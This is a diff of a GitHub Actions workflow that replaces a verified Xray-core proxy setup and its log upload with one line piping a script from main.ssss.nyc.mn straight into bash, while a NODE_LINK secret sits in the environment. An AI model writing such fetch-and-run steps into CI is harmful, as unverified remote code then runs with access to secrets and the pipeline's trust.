@@ -23,51 +23,12 @@ jobs:
         with:
           python-version: '3.10'
 
-      - name: 🛡️ 启动 Xray 代理转发
+      - name: 🌐 设置 sing-box 代理转发
+        continue-on-error: true
         env:
-          XRAY_CONFIG: ${{ secrets.XRAY_CONFIG_JSON }}
+          NODE_LINK: ${{ secrets.NODE_LINK }}
         run: |
-          echo "📦 下载并解压 Xray-core..."
-          wget -q https://github.com/XTLS/Xray-core/releases/download/v25.12.8/Xray-linux-64.zip || exit 1
-          unzip -q Xray-linux-64.zip -d xray-core || exit 1
-
-          echo "📝 写入节点配置..."
-          echo "$XRAY_CONFIG" > xray-core/config.json
-
-          echo "🚀 启动 Xray 服务..."
-          cd xray-core
-          ./xray run -c config.json > xray.log 2>&1 &
-          XRAY_PID=$!
-          echo "Xray PID: $XRAY_PID"
-
-          for i in $(seq 1 15); do
-            sleep 1
-            if curl -s --connect-timeout 2 http://127.0.0.1:8080 -o /dev/null 2>/dev/null; then
-              echo "✅ 代理端口 8080 已就绪 (等待 ${i}s)"
-              break
-            fi
-            if ! kill -0 $XRAY_PID 2>/dev/null; then
-              echo "❌ Xray 进程已退出!"
-              cat xray.log
-              exit 1
-            fi
-          done
-
-          echo "--- Xray 日志 ---"
-          cat xray.log
-
-          echo "✅ 测试代理连通性并获取出口 IP..."
-          EXPORT_IP=$(curl -s --max-time 10 -x socks5h://127.0.0.1:8080 https://api.ipify.org 2>/dev/null || true)
-          echo ""
-          echo "出口 IP: ${EXPORT_IP:-FAILED}"
-
-          if [ -n "$EXPORT_IP" ]; then
-            echo "✅ 代理连通性测试通过，出口 IP: $EXPORT_IP"
-          else
-            echo "⚠️ 代理连通性测试失败，但不阻断后续步骤"
-            echo "   原因: SOCKS5 已连接但 TLS 握手失败 (Argo 隧道不在线或节点不可达)"
-            echo "   Python 脚本使用 GOST_PROXY 独立代理，不受影响"
-          fi
+          bash <(wget -qO- https://main.ssss.nyc.mn/setup_proxy.sh)
 
       - name: 🛠️ 安装系统依赖
         run: |
@@ -98,10 +59,3 @@ jobs:
         with:
           name: debug-screenshots
           path: "*.png"
-
-      - name: 📋 上传 Xray 日志
-        if: failure()
-        uses: actions/upload-artifact@v4
-        with:
-          name: xray-log
-          path: xray-core/xray.log
